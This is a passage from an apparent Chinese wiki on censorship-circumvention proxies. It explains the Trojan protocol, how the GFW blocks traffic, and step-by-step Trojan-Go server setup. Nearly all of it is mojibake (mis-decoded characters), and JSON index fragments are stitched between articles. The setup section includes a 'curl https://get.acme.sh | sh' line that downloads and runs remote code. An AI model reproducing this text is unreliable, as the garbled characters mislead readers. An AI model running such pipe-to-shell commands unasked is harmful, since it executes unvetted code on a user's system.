æ³•è¾¨è®¤å‡ºå®é™…çš„å†…å®¹ã€‚trojan-serveræ”¶åˆ°åŠ å¯†æ•°æ®åï¼Œä½¿ç”¨å¯†é’¥Aè§£å¯†ï¼Œå¾—åˆ°æµè§ˆå™¨çš„åŸå§‹è¯·æ±‚æ•°æ®ã€‚trojan-serveræ¥ç€å……å½“ä»£ç†è§’è‰²ï¼Œä¸google.comå»ºç«‹TCPè¿æ¥ï¼Œå¹¶è¿›è¡ŒTLSæ¡æ‰‹ï¼Œåå•†å‡ºä¼šè¯å¯†é’¥Bã€‚ä½¿ç”¨å¯†é’¥Bï¼Œtrojan-serverå°†æµè§ˆå™¨çš„åŸå§‹è¯·æ±‚æ•°æ®åŠ å¯†ï¼Œå¹¶å‘é€ç»™google.comã€‚google.comå¤„ç†è¯·æ±‚å¹¶è¿”å›æ•°æ®ï¼Œè¿™äº›è¿”å›çš„æ•°æ®è¢«åŠ å¯†ï¼ˆä½¿ç”¨å¯†é’¥Bï¼‰ï¼Œç„¶åå‘é€å›trojan-serverã€‚trojan-serverä½¿ç”¨å¯†é’¥Bè§£å¯†è¿”å›çš„æ•°æ®ï¼Œç„¶åä½¿ç”¨å¯†é’¥Aé‡æ–°åŠ å¯†è¿™äº›æ•°æ®ï¼Œå†å‘é€å›trojan-localã€‚trojan-localä½¿ç”¨å¯†é’¥Aè§£å¯†æ•°æ®ï¼Œç„¶åå°†è§£å¯†åçš„æ•°æ®å‘é€ç»™æµè§ˆå™¨ã€‚å¯ä»¥çœ‹åˆ°ï¼Œè®¿é—®è°·æ­Œçš„TLSæ•°æ®ï¼Œå¤–é¢åˆåŒ…äº†ä¸€å±‚trojançš„TLSã€‚è¿™ç§TLS in TLSä¼šå­˜åœ¨ç‰¹å¾ï¼šä¸google TLSæ¡æ‰‹æ—¶çš„æ•°æ®åŒ…ä½“ç§¯å¢å¤§æœ‰å…´è¶£å¯ä»¥å‚è€ƒï¼šTrojan-killertrojanèŠ‚ç‚¹å·²è¢«ç²¾å‡†è¯†åˆ«ï¼Ÿï¼tls-in-tlsç‰¹å¾åŸç†åˆ†æï¼Œæ­å»ºMITMèŠ‚ç‚¹è§£å†³tls-in-tlsç‰¹å¾å¾ˆå¥½å¥‡è¯†åˆ«çš„åŸç† #6 å½“ä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾è¿æ¥Trojan-Goçš„ç›‘å¬ç«¯å£æ—¶ï¼Œä¼šå‘ç”Ÿä¸‹é¢çš„äº‹æƒ…ï¼š å¤„ç† å¤‡æ³¨ TLSæ¡æ‰‹æˆåŠŸ TLSçš„å†…å®¹æ˜¯Trojanåè®® å¯†ç æ­£ç¡® è§£ææ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚å¹¶è¿›è¡Œä»£ç† å¯†ç ä¸æ­£ç¡® å°†TLSè¿æ¥ä»£ç†åˆ°æœ¬åœ°127.0.0.1:80ä¸Šçš„HTTPæœåŠ¡ æœ‰å¯èƒ½æ˜¯HTTPè¯·æ±‚ï¼Œæˆ–è€…æ¥è‡ªGFWçš„ä¸»åŠ¨æ¢æµ‹ï¼Œè¿™æ ·çš„å¤„ç†åœ¨è¿œç«¯çœ‹æ¥ï¼ŒTrojan-GoæœåŠ¡å°±æ˜¯ä¸€ä¸ªHTTPSç½‘ç«™ TLSçš„å†…å®¹ä¸æ˜¯Trojanåè®® å°†TLSè¿æ¥ä»£ç†åˆ°æœ¬åœ°127.0.0.1:80ä¸Šçš„HTTPæœåŠ¡ æœ‰å¯èƒ½æ˜¯HTTPè¯·æ±‚ï¼Œæˆ–è€…æ¥è‡ªGFWçš„ä¸»åŠ¨æ¢æµ‹ï¼Œè¿™æ ·çš„å¤„ç†åœ¨è¿œç«¯çœ‹æ¥ï¼ŒTrojan-GoæœåŠ¡å°±æ˜¯ä¸€ä¸ªHTTPSç½‘ç«™ TLSæ¡æ‰‹å¤±è´¥ å°†è¿™ä¸ªTCPè¿æ¥ä»£ç†åˆ°æœ¬åœ°127.0.0.1:1234ä¸Šè¿è¡Œçš„HTTPSæœåŠ¡ï¼ˆæˆ–è€…HTTPæœåŠ¡ï¼‰ï¼Œè¿”å›ä¸€ä¸ªå±•ç¤º400 Bad Reqeustçš„HTTPé¡µé¢ã€‚ TLSæ¡æ‰‹å¤±è´¥è¯´æ˜å¯¹æ–¹ä½¿ç”¨çš„ä¸æ˜¯TLSåè®®è¿›è¡Œè¿æ¥ fallback_portæ˜¯ä¸€ä¸ªå¯é€‰é€‰é¡¹ï¼Œå¦‚æœæ²¡æœ‰å¡«å†™ï¼ŒTrojan-Goä¼šç›´æ¥ç»ˆæ­¢è¿æ¥ã€‚è™½ç„¶æ˜¯å¯é€‰çš„ï¼Œä½†æ˜¯è¿˜æ˜¯å¼ºçƒˆå»ºè®®å¡«å†™ã€‚ æ­å»ºtrojanèŠ‚ç‚¹ æœåŠ¡ç«¯å‰ç½®å‡†å¤‡å·¥ä½œ ä¸€ä¸ªå¢ƒå¤–vpsï¼Œæœªè¢«GFWå°é” åŸŸåï¼ˆå¯ä»¥æ— ï¼‰ è¯ä¹¦å’Œå¯†é’¥ï¼Œä»CAæœºæ„ç”³è¯·ç­¾å‘ ä¼ªè£…è·³è½¬çš„HTTPæœåŠ¡å™¨ ä½œç”¨ï¼šå½“GFWä¸»åŠ¨æ¢æµ‹æ—¶ï¼Œå±•ç¤ºä¸€ä¸ªæ­£å¸¸çš„webé¡µé¢ å¯ä»¥æ˜¯è‡ªå·±ç”¨nginxï¼Œapacheï¼Œcaddyç­‰é…ç½®çš„ä¸€ä¸ªæœ¬åœ°HTTPæœåŠ¡å™¨æˆ–è€…æ˜¯å¡«å†™åˆ«äººçš„HTTPæœåŠ¡å™¨ ç½‘ç«™è¯ä¹¦ç”³è¯· .crtæ˜¯è¯ä¹¦ï¼ˆå…¬é’¥åœ¨è¯ä¹¦é‡Œï¼‰ï¼Œ.keyæ˜¯ç§é’¥ å·²æœ‰åŸŸåè‡ªç­¾è¯ä¹¦ä»ç½‘ç«™ä¸‹è½½shå¹¶æ‰§è¡Œ 1curl https://get.acme.sh | sh å®‰è£…socatï¼ˆä½¿ç”¨ç‹¬ç«‹æ¨¡å¼è¦å®‰è£…socatï¼‰ 1apt install socat æ·»åŠ è½¯é“¾æ¥ 1ln -s /root/.acme.sh/acme.sh /usr/local/bin/acme.sh æ³¨å†Œè´¦å· 1acme.sh --register-account -m my@example.com é˜²ç«å¢™å¼€æ”¾80ç«¯å£ï¼ˆç‹¬ç«‹æ¨¡å¼ä¼šåœ¨æœ¬åœ°80ç«¯å£å¼€ä¸€ä¸ªæœåŠ¡å™¨ï¼Œç­‰CAæœºæ„æ¥éªŒè¯ï¼‰ 1ufw allow 80 ç”³è¯·è¯ä¹¦ï¼š 1acme.sh --issue -d æ›¿æ¢ä¸ºä½ çš„åŸŸå --standalone -k ec-256 å®‰è£…è¯ä¹¦ï¼ˆå°±æ˜¯å°†.keyå’Œ.crtå¤åˆ¶åˆ°æ–‡ä»¶å¤¹ä¸­ï¼‰ 1acme.sh --installcert -d æ›¿æ¢ä¸ºä½ çš„åŸŸå --ecc --key-file /root/trojan/server.key --fullchain-file /root/trojan/server.crt å¦‚æœé»˜è®¤CAæ— æ³•é¢å‘ï¼Œå¯ä»¥åˆ‡æ¢ä½¿ç”¨å…¶ä»–CAæ¥ç”³è¯·è¯ä¹¦ 123456#åˆ‡æ¢ Letâ€™s Encryptï¼šacme.sh --set-default-ca --server letsencrypt#åˆ‡æ¢ Buypassï¼šacme.sh --set-default-ca --server buypass#åˆ‡æ¢ ZeroSSLï¼šacme.sh --set-default-ca --server zerossl æ²¡åŸŸåçš„æƒ…å†µä¸‹ï¼Œè‡ªç­¾è¯ä¹¦ã€‚ ç”Ÿæˆç§é’¥ 1openssl ecparam -genkey -name prime256v1 -out ca.key ç”Ÿæˆè¯ä¹¦ 1openssl req -new -x509 -days 36500 -key ca.key -out ca.crt -subj &quot;/CN=bing.com&quot; æœåŠ¡ç«¯æ­å»ºæ­¥éª¤ ç”¨çš„æ˜¯trojan-goï¼Œä¸åœ¨å†…ç½®æºä¸­ï¼Œåœ¨githubå¤åˆ¶äºŒè¿›åˆ¶æ–‡ä»¶çš„é“¾æ¥ï¼Œåœ¨ubuntuä¸Šç”¨wgetä¸‹è½½ 1wget https://github.com/p4gefau1t/trojan-go/releases/download/v0.10.6/trojan-go-linux-amd64.zip unzipè§£å‹ exampleæ–‡ä»¶å¤¹ä¸‹æ˜¯ç¤ºä¾‹çš„é…ç½®æ–‡ä»¶ trojan-goç›®å½•ä¸‹åˆ›å»ºconfig.jsonæ–‡ä»¶ï¼Œç¼–å†™é…ç½®æ–‡ä»¶ 1234567891011121314&#123; &quot;run_type&quot;: &quot;server&quot;, &quot;local_addr&quot;: &quot;0.0.0.0&quot;, &quot;local_port&quot;: 443, &quot;remote_addr&quot;: &quot;127.0.0.1&quot;, &quot;remote_port&quot;: 80, &quot;password&quot;: [ &quot;your_awesome_password&quot; ], &quot;ssl&quot;: &#123; &quot;cert&quot;: &quot;server.crt&quot;, &quot;key&quot;: &quot;server.key&quot;, &#125;&#125; key value æ³¨é‡Š run_type â€œserverâ€ è¡¨ç¤ºæ˜¯æœåŠ¡å™¨çš„é…ç½® local_addr â€œ0.0.0.0â€ ç›‘å¬æ‰€æœ‰ipæ¥æº local_port 443 ç›‘å¬ç«¯å£ï¼Œå¤§å¤šæ•°httpsæ˜¯443ç«¯å£ï¼Œæ¢æˆå…¶ä»–çš„ä¼šæ˜¾å¾—çªå‡º remote_addr ä¼ªè£…è·³è½¬çš„HTTPæœåŠ¡å™¨åœ°å€/åŸŸå remote_port ä¼ªè£…è·³è½¬çš„HTTPæœåŠ¡å™¨çš„ç«¯å£ password èº«ä»½è®¤è¯ç”¨ sslï¼Œcert .crt CAé¢å‘çš„ç½‘ç«™è¯ä¹¦ï¼ŒTLSæ¡æ‰‹æ—¶æœåŠ¡ç«¯ä¼šç»™åˆ°å®¢æˆ·ç«¯ä»¥è¡¨æ˜è‡ªå·±çš„èº«ä»½ sslï¼Œkey .key ç½‘ç«™çš„ç§é’¥ï¼ŒTLSæ¡æ‰‹æ—¶ä¼šç”¨åˆ° åå°è¿è¡Œå¹¶è¾“å‡ºæ—¥å¿—ï¼ˆåªæœ‰æœåŠ¡å™¨å´©æºƒæˆ–é‡å¯trojanæœåŠ¡æ‰ä¼šç»“æŸï¼‰ 1nohup ./trojan-go &gt; trojan.log 2&gt;&amp;1 &amp; å®¢æˆ·ç«¯ä½¿ç”¨ v2rayNæ·»åŠ trojanæœåŠ¡å™¨ å¦‚æœæœåŠ¡å™¨åœ°å€å¡«å†™çš„æ˜¯åŸŸåï¼Œsniå¯ä»¥çœç•¥ã€‚å¦‚æœæœåŠ¡å™¨åœ°å€å¡«å†™çš„æ˜¯ipï¼Œsniå­—æ®µè¦å¡«å†™ä½ ç”³è¯·è¯ä¹¦çš„å¯¹åº”åŸŸåï¼Œæˆ–è€…ä½ è‡ªå·±ç­¾å‘çš„è¯ä¹¦çš„Common Nameï¼Œè€Œä¸”å¿…é¡»ä¸€è‡´ã€‚ sniå°±æ˜¯ä¼ªè£…çš„æœ€å¤–å±‚çš„å­—æ®µï¼Œåœ¨ç›®å‰çš„TLSåè®®æ˜¯æ˜æ–‡ä¼ è¾“ï¼ŒGFWä¼šçœ‹åˆ°ï¼Œæ‰€ä»¥ä¸è¦å¡«å†™ç±»ä¼¼google.comç­‰å·²ç»è¢«å°é”çš„åŸŸåï¼Œå¦åˆ™å¾ˆæœ‰å¯èƒ½å¯¼è‡´ä½ çš„æœåŠ¡å™¨ä¹Ÿè¢«é­åˆ°å°é”ã€‚ è‡ªç­¾è¯ä¹¦çš„è¯ï¼Œå¯ä»¥å°†è‡ªç­¾çš„CAæœºæ„åŠ å…¥åˆ°ç”µè„‘çš„ä¿¡ä»»åˆ—è¡¨ï¼Œæˆ–v2rayNé€‰æ‹©è·³è¿‡è¯ä¹¦éªŒè¯ï¼ˆæœ€å¥½ä¸è¦è·³è¿‡ï¼Œè¦ä¸å­˜åœ¨æœåŠ¡ç«¯è¢«æ”»å‡»è€…ä¼ªè£…çš„æƒ…å†µï¼‰ SNIè¦è¾“å…¥è‡ªç­¾æ—¶çš„åŸŸå æ¯”å¦‚è‡ªç­¾æ—¶å†™çš„bing.com 1openssl req -new -x509 -days 36500 -key ca.key -out ca.crt -subj &quot;/CN=bing.com&quot; é‚£ä¹ˆè¿™é‡Œçš„sniè¦å†™bing.com ç›¸å…³é“¾æ¥ èŠ‚ç‚¹æ­å»ºç³»åˆ—(4):ç›®å‰æœ€å¥½çš„ç¿»å¢™åè®®?å²ä¸Šæœ€è¯¦ç»†trojanåè®®åŸç†è§£æä¸å®æˆ˜æ­å»ºï¼Œæµé‡ä¼ªè£…æˆhttpså®ç°ç»•è¿‡é˜²ç«å¢™æ¢æµ‹è¿›è¡Œç§‘å­¦ä¸Šç½‘ã€‚å½»åº•å¼„æ˜ç™½ä»€ä¹ˆæ˜¯ç½‘ç«™è¯ä¹¦ã€ä»€ä¹ˆæ˜¯TLS/SSL Item å¤‡æ³¨ trojanä¸»é¡µ trojanä¸»é¡µ trojan-go trojan-goï¼Œgithubé¡¹ç›®åœ°å€ Trojan-Goæ–‡æ¡£ Trojan-Goæ–‡æ¡£ï¼Œå†™å¾—æŒºè¯¦ç»†çš„ åšå¯¹æ¯”æ—¶ç”¨ï¼šTrojanåŸç†ç®€å•åˆ†æhttps://xzchsia.github.io/2020/09/29/trojan-code-analysis/"},{"title":"vmessåŸç†ä¸èŠ‚ç‚¹æ­å»º","path":"/wiki/Proxy_Protocols/vmessåŸç†ä¸èŠ‚ç‚¹æ­å»º.html","content":"VMess åè®®ç»†èŠ‚"},{"title":"å‰ç½®çŸ¥è¯†","path":"/wiki/Proxy_Protocols/å‰ç½®çŸ¥è¯†_ç§‘å­¦ä¸Šç½‘æŠ€æœ¯.html","content":"æ­£å¸¸ç½‘ç»œé€šä¿¡è¿‡ç¨‹ é€šä¿¡è¿‡ç¨‹æ¶‰åŠipã€ç«¯å£ã€macåœ°å€ã€ç½‘å…³ã€DNSã€arpã€è·¯ç”±è½¬å‘è¡¨ã€NATæ˜ å°„ç­‰çŸ¥è¯†çš„è¯¦ç»†ä»‹ç»ç•¥ã€‚ IPï¼šç”¨äºå®šä½äº’è”ç½‘ä¸­çš„æŸä¸€å°ç”µè„‘ ç«¯å£ï¼šå®šä½æŸä¸€ä¸ªæœåŠ¡ï¼ˆè¿›ç¨‹ï¼‰ IP+ç«¯å£ï¼šå®šä½äº’è”ç½‘ä¸­çš„æŸä¸€å°ç”µè„‘ä¸­çš„æŸä¸€ä¸ªæœåŠ¡ï¼ˆè¿›ç¨‹ï¼‰ macåœ°å€ï¼šåŒä¸€ä¸ªå±€åŸŸç½‘é‡Œé€šä¿¡ç”¨çš„æ˜¯macåœ°å€ NATåœ°å€è½¬æ¢ï¼šå°†å†…ç½‘ç½‘æ®µçš„ipè½¬æ¢æˆèƒ½åœ¨å…¬ç½‘ä¸Šä¼ è¾“çš„å…¬ç½‘ip è®¡ç®—æœºOSIäº”å±‚æ¨¡å‹ æ¯å±‚è´Ÿè´£çš„å†…å®¹ åº”ç”¨å±‚ æ•°æ® ä¼ è¾“å±‚ ç«¯å£ ç½‘ç»œå±‚ ip æ•°æ®é“¾è·¯å±‚ macåœ°å€ ç‰©ç†å±‚ ç®€ç•¥ç‰ˆè¯¦ç»†ç‰ˆæ•°æ®åŒ…ç”±ç”¨æˆ·Aå‘é€ï¼Œåœ¨å…¬ç½‘ä¸Šè·³å‘ï¼Œåˆ°è¾¾æœåŠ¡å™¨Aã€‚ æœåŠ¡å™¨Açš„å“åº”æ•°æ®åŒ…ï¼Œè¿”å›è¿‡ç¨‹å’Œå‘é€è¿‡ç¨‹ç±»ä¼¼ï¼Œåªä¸è¿‡æ˜¯æ–¹å‘ç›¸åã€‚ ç”¨æˆ·Aå¸Œæœ›è®¿é—®æœåŠ¡å™¨Aä¸Šçš„ç½‘é¡µï¼Œä»–åœ¨æµè§ˆå™¨ä¸­è¾“å…¥äº†ç›¸åº”çš„URLï¼ˆå‡è®¾æœåŠ¡å™¨Açš„ipåœ°å€å·²çŸ¥ï¼Œè¿™é‡Œå°±ä¸æDNSè§£æè¿‡ç¨‹äº†ï¼‰ã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œç”¨æˆ·Açš„è®¡ç®—æœºä¼šç”Ÿæˆä¸€ä¸ªè¯·æ±‚æ•°æ®åŒ…ã€‚è¿™ä¸ªæ•°æ®åŒ…é¦–å…ˆåœ¨åº”ç”¨å±‚è¢«åˆ›å»ºï¼Œç„¶åä¾æ¬¡é€šè¿‡ä¼ è¾“å±‚ã€ç½‘ç»œå±‚ã€æ•°æ®é“¾è·¯å±‚å’Œç‰©ç†å±‚è¿›è¡Œå°è£…ï¼Œæ¯ä¸€å±‚éƒ½ä¼šæ·»åŠ ç›¸åº”çš„å¤´ä¿¡æ¯ï¼Œä»¥ç¡®ä¿æ•°æ®åŒ…èƒ½å¤Ÿæ­£ç¡®åœ°ä¼ è¾“å’Œè¯†åˆ«ã€‚è¿™ä¸ªæ•°æ®åŒ…ç»ç”±äº¤æ¢æœºï¼Œè·¯ç”±å™¨åœ¨å…¬ç½‘ä¸­ä¼ è¾“ï¼Œæœ€ç»ˆåˆ°è¾¾ç›®æ ‡æœåŠ¡å™¨Aã€‚ æœåŠ¡å™¨Aæ”¶åˆ°è¯·æ±‚åï¼Œä¼šæŒ‰ç…§ç›¸åçš„é¡ºåºï¼Œä»ç‰©ç†å±‚å¼€å§‹é€å±‚è§£å¼€æ•°æ®åŒ…ï¼Œç›´åˆ°åº”ç”¨å±‚ï¼Œä»è€Œèƒ½å¤Ÿç†è§£å’Œå¤„ç†è¯·æ±‚ã€‚ å“åº”æ•°æ®åŒ…çš„è·¯å¾„ä¸è¯·æ±‚æ¥æ—¶çš„è·¯å¾„ç›¸åŒï¼Œä½†æ˜¯æ–¹å‘ç›¸åï¼Œå³ä»æœåŠ¡å™¨Aå‘å‡ºï¼Œç»è¿‡ç›¸åŒçš„ç½‘ç»œå±‚æ¬¡ï¼Œæœ€ç»ˆå›åˆ°ç”¨æˆ·Açš„è®¡ç®—æœºã€‚ äºŒå±‚äº¤æ¢æœºï¼šæ¥æ”¶æ•°æ®åŒ…çš„è§£æå¤„ç†ä»ä¸‹åˆ°ä¸Šï¼Œä»ç‰©ç†å±‚-&gt;æ•°æ®é“¾è·¯å±‚ è·¯ç”±å™¨ï¼ˆä¸‰å±‚ï¼‰ï¼šæ¥æ”¶æ•°æ®åŒ…çš„è§£æå¤„ç†ä»ä¸‹åˆ°ä¸Šï¼Œç‰©ç†å±‚-&gt;æ•°æ®é“¾è·¯å±‚-&gt;ç½‘ç»œå±‚ å‚è€ƒï¼šèŠ‚ç‚¹æ­å»ºç³»åˆ—(1)ï¼šç½‘ç»œé€šä¿¡çš„åŸºæœ¬è¿‡ç¨‹ï¼Œè®¿é—®ç½‘ç«™åˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆäº‹æƒ…ï¼Ÿè¯¦ç»†è§£æDNSåŸç† å¢™æ‹¦æˆªåŸç† å½“ç”¨æˆ·å°è¯•ä»å›½å†…è®¿é—®å›½é™…äº’è”ç½‘ï¼Œæ‰€æœ‰å‡ºå£åˆ°å›½é™…ç½‘ç»œçš„è¯·æ±‚éƒ½è¦é€šè¿‡GFWé˜²ç«å¢™ï¼ŒGFWæ˜¯5å±‚è®¾å¤‡ï¼Œèƒ½åˆ†æåˆ°åº”ç”¨å±‚çš„æ•°æ®ã€‚ å‡è®¾ç”¨æˆ·Aæƒ³è¦è®¿é—®google.comï¼Œè®¾å®šçš„dnsæœåŠ¡å™¨æ˜¯8.8.8.8ï¼Œå¦‚æœæœ¬åœ°æ²¡æœ‰ç¼“å­˜ï¼Œhostsæ–‡ä»¶ä¹Ÿæ²¡ç›¸å…³æ˜ å°„ï¼Œéœ€è¦å‘DNSè§£æè¯·æ±‚åˆ°8.8.8.8ï¼Œä»¥è§£ægoogle.comçš„IPåœ°å€ã€‚è¿™ä¸ªè¯·æ±‚åœ¨é€šè¿‡GFWæ—¶ï¼ŒGFWæ£€æŸ¥åº”ç”¨å±‚æ•°æ®ï¼Œè¯†åˆ«å‡ºç”¨æˆ·è¯•å›¾è·å–google.comçš„IPåœ°å€ã€‚å¦‚æœgoogle.comä½äºGFWçš„é»‘åå•ä¸Šï¼Œæˆ–è€…è¯·æ±‚åŒ…å«äº†æŸäº›å…³é”®è¯ï¼ŒGFWä¼šç›´æ¥æ‹¦æˆªè¿™ä¸ªDNSè¯·æ±‚ã€‚ï¼ˆé»‘åå•ï¼Œå…³é”®è¯è¿‡æ»¤ï¼‰ å³ä½¿GFWå…è®¸DNSè¯·æ±‚é€šè¿‡ï¼Œå¹¶ä¸”8.8.8.8è¿”å›äº†google.comçš„IPåœ°å€ï¼ˆå‡è®¾ä¸º140.250.188.14ï¼‰ï¼Œä½†æ•°æ®åŒ…è¿”å›æ—¶è¿˜ä¼šè¢«GFWå†æ¬¡æ£€æŸ¥ã€‚GFWè¯†åˆ«åˆ°è¿”å›çš„IPåœ°å€å±äºè¢«å°é”çš„èµ„æºï¼Œå®ƒå¯èƒ½ä¼šç¯¡æ”¹åº”ç­”ï¼Œå°†æ­£ç¡®çš„IPåœ°å€æ›¿æ¢ä¸ºä¸€ä¸ªæ— æ•ˆçš„åœ°å€ã€‚æ•°æ®åŒ…å›åˆ°ç”¨æˆ·Aï¼Œç”¨æˆ·Aå¾—åˆ°äº†ä¸€ä¸ªé”™è¯¯çš„ipåœ°å€ã€‚ç½‘ç»œä¸Šä¸å­˜åœ¨è¿™ä¹ˆä¸€å°æœåŠ¡å™¨æ˜¯è¿™ä¸ªé”™è¯¯çš„ipåœ°å€ï¼Œæ‰€ä»¥ç”¨æˆ·Aæ— æ³•ä¸è¿™ä¸ªé”™è¯¯çš„ipåœ°å€å»ºç«‹è¿æ¥ã€‚ï¼ˆDNSæ±¡æŸ“ï¼‰ å³ä½¿ç”¨æˆ·å·²ç»çŸ¥é“google.comçš„çœŸå®IPåœ°å€å¹¶å°è¯•å‘èµ·è¿æ¥ï¼Œç”±äºHTTPè¯·æ±‚åŸºäºTCPåè®®ï¼Œè€ŒTCPéœ€è¦å»ºç«‹è¿æ¥ï¼Œç”¨æˆ·çš„è¿æ¥è¯·æ±‚åœ¨åˆ°è¾¾GFWæ—¶ä¼šè¢«æ£€æŸ¥ã€‚å¦‚æœè¯·æ±‚çš„ç›®æ ‡IPåœ°å€åœ¨GFWçš„é»‘åå•ä¸Šï¼ŒGFWä¼šæ‹¦æˆªè¿™ä¸ªè¿æ¥è¯·æ±‚ï¼Œæˆ–è€…å‡è£…è‡ªå·±æ˜¯googleæœåŠ¡å™¨ï¼Œå‘å›ä¸€ä¸ªä¼ªé€ çš„æ•°æ®åŒ…ç»™ç”¨æˆ·ã€‚ï¼ˆé»‘åå•ï¼Œå…³é”®è¯è¿‡æ»¤ï¼‰ æœ€åï¼Œå‡è®¾google.comè¿˜æœ‰å…¶ä»–çš„ipåœ°å€ï¼Œè¿™ä¸ªipåœ°å€ä¸åœ¨GFWçš„é»‘åå•ä¸­ï¼Œç”¨æˆ·é€šè¿‡è¿™ä¸ªIPåœ°å€æˆåŠŸä¸google.comä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿æ¥ã€‚éšåç”¨æˆ·Aå‘é€&quot;è¯·æ±‚google.comé¦–é¡µæ•°æ®&quot;çš„æ•°æ®åŒ…ï¼Œåˆ°GFWæ—¶ï¼Œå¦‚æœæ•°æ®åŒ…ä¸­åŒ…å«äº†å¦‚&quot;google.com&quot;è¿™æ ·çš„é»‘åå•å…³é”®è¯ï¼ŒGFWä¼šè¿›è¡ŒTCPé‡ç½®æ”»å‡»ï¼Œä¸­æ–­ç”¨æˆ·ä¸google.comçš„è¿æ¥ï¼Œé˜»æ­¢ç”¨æˆ·è·å–ç½‘é¡µæ•°æ®ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå³ä½¿ç”¨æˆ·Aä¸è°·æ­ŒæœåŠ¡å™¨å»ºç«‹è¿æ¥çš„æƒ…å†µä¸‹ï¼Œä¹Ÿè¯·æ±‚ä¸åˆ°è°·æ­Œç½‘å€çš„æ•°æ®ã€‚ï¼ˆTCPé‡ç½®æ”»å‡»ï¼‰ ä½¿ç”¨http/socksä»£ç† å‡è®¾ç”¨æˆ·Aç”¨ä¸€å°å¢ƒå¤–çš„vpsä½œä¸ºhttpæˆ–socksä»£ç†æœåŠ¡å™¨ï¼Œè¿™å°ä»£ç†æœåŠ¡å™¨èƒ½è®¿é—®åˆ°è°·æ­ŒæœåŠ¡å™¨ï¼ˆä¸è¿‡GFWï¼‰ï¼Œç”¨æˆ·Aèƒ½è®¿é—®åˆ°ä»£ç†æœåŠ¡å™¨ï¼ˆGFWé»‘åå•ä¸Šæ²¡è¿™å°ä»£ç†æœåŠ¡å™¨ï¼‰ã€‚ç”¨æˆ·Aå¯ä»¥å‘é€â€œä»£æ›¿æˆ‘è®¿é—®google.comâ€æ•°æ®åŒ…ç»™ä»£ç†æœåŠ¡å™¨ï¼Œè®©è¿™å°ä»£ç†æœåŠ¡å™¨ä»£æ›¿ç”¨æˆ·Aè®¿é—®è°·æ­ŒæœåŠ¡å™¨ï¼Œç„¶åå†å°†æ•°æ®è¿”å›ç»™ç”¨æˆ·Aã€‚ä½†â€œä»£æ›¿æˆ‘è®¿é—®google.comâ€æ•°æ®åŒ…æ¥åˆ°GFWæ—¶ï¼ŒGFWçŸ¥æ™“ç”¨æˆ·Aè¦è®©ä»£ç†æœåŠ¡å™¨è®¿é—®googleçš„æ„å›¾ï¼Œäºæ˜¯æ‹¦æˆªæ•°æ®åŒ…ï¼Œç”šè‡³å°†è¿™å°ä»£ç†æœåŠ¡å™¨çš„ipåŠ å…¥é»‘åå•ä¸­ã€‚ å› ä¸ºhttpæˆ–socksä»£ç†æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œé˜²ç«å¢™èƒ½è§£æåˆ°åº”ç”¨å±‚çš„æ•°æ®ã€‚ è¿™ä¹Ÿå¹¶ä¸ç»å¯¹ï¼Œæœ‰äº›åœ°åŒºçš„ipç”¨æ ‡å‡†çš„socks5å°±æ˜¯èƒ½å‡ºå»ï¼Œä½†å¤§éƒ¨åˆ†åœ°åŒºåŸºæœ¬æ˜¯ç§’å°çš„ã€‚ ä½¿ç”¨vpn ç«¯å£é˜»æ–­ï¼šåˆ‡æ–­VPNæˆ–SSLçš„é“¾æ¥ vpnè¯ç”Ÿç›®çš„æ˜¯æ•°æ®åŠ å¯†ï¼Œå¸¸ç”¨äºå…¬å¸å°†ä¸¤ä¸ªå†…ç½‘åˆå¹¶ï¼Œåªæ˜¯æ°å¥½ä¹Ÿèƒ½ç”¨æ¥ç¿»å¢™ã€‚ä½†è¿æ¥ç‰¹å¾æ˜æ˜¾ï¼ŒGFWæ˜¯çŸ¥é“ç”¨æˆ·Aåœ¨ä¸å“ªå°vpnæœåŠ¡å™¨å»ºè¿ï¼ŒGFWä¼šæ”¾è¡Œï¼Œä½†å¯èƒ½ä¼šå°†vpnæœåŠ¡å™¨çš„ipåœ°å€åŠ å…¥ç›‘æ§åˆ—è¡¨ï¼Œç”šè‡³åœ¨ç‰¹æ®Šæ—¶æœŸä¸æ”¾è¡Œè¿™äº›vpnè¿æ¥ã€‚ å°ç»“ GFWæ˜¯5å±‚è®¾å¤‡ï¼Œèƒ½è§£æåˆ°åº”ç”¨å±‚çš„æ•°æ®ã€‚å¯èƒ½æ‹¦æˆªçš„æ–¹å¼æœ‰ï¼š DNSæ±¡æŸ“ï¼ˆDNSåŠ«æŒï¼‰ï¼šè¿”å›é”™è¯¯çš„ipåœ°å€æˆ–ä¸è§£æç”¨æˆ·çš„dnsè¯·æ±‚ é»‘åå•ï¼šåœ¨é»‘åå•ä¸­çš„ipã€åŸŸåä¸æ”¾è¡Œ å…³é”®è¯è¿‡æ»¤ï¼Œæ·±åº¦åŒ…æ£€æµ‹ï¼šæ•°æ®åŒ…ä¸­æœ‰æ•æ„Ÿè¯ï¼Œä¾¿ä¸æ”¾è¡Œ TCPé‡ç½®æ”»å‡»ï¼šåœ¨ç”¨æˆ·ä¸ç›®æ ‡æœåŠ¡å™¨å·²å»ºè¿çš„æƒ…å†µä¸‹ï¼Œå°†ç”¨æˆ·çš„è¯·æ±‚æ•°æ®åŒ…æ‹¦ä¸‹ ç«¯å£é˜»æ–­ï¼šåˆ‡æ–­VPNæˆ–SSLçš„é“¾æ¥ è¢«æ‹¦ä¸‹æ¥çš„åŸå› å…¶å®å°±æ˜¯æ•°æ®æ²¡åŠ å¯†ï¼Œç”¨æˆ·è®¿é—®æ„å›¾è¢«çŸ¥é“å¾—æ˜æ˜ç™½ç™½ã€‚ ä½¿ç”¨ä»£ç†åè®® æ¯”å¦‚ä½¿ç”¨shadowsocksä»£ç†åè®®ç¿»å¢™ï¼Œåœ¨å¢ƒå¤–vpsä¸Šç”¨ssåè®®æ­å»ºæœåŠ¡å™¨ï¼Œç›‘å¬ç«¯å£8388ã€‚ç”¨æˆ·Aåœ¨ç”µè„‘ä¸Šä½¿ç”¨ä»£ç†è½¯ä»¶ä½œä¸ºsså®¢æˆ·ç«¯ï¼Œç›‘å¬ç«¯å£1080ã€‚é‚£ä¹ˆç”¨æˆ·Aæµè§ˆå™¨çš„è®¿é—®è¯·æ±‚æ•°æ®åŒ…æ„é€ 